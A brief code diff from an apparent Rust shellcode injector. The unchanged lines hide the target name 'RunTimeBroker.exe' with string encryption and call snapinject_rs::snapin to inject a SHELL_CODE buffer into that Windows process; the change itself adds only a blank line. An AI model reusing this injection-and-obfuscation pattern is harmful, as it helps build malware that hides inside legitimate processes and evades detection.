@@ -29,4 +29,5 @@ fn main() {
     let process_name = lc!("RunTimeBroker.exe").to_string();
 
     snapinject_rs::snapin(&process_name, &SHELL_CODE).unwrap();
+
 }
